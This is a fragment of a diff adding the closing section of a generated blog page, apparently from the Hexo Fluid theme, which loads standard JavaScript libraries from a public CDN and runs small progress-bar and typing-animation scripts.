+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
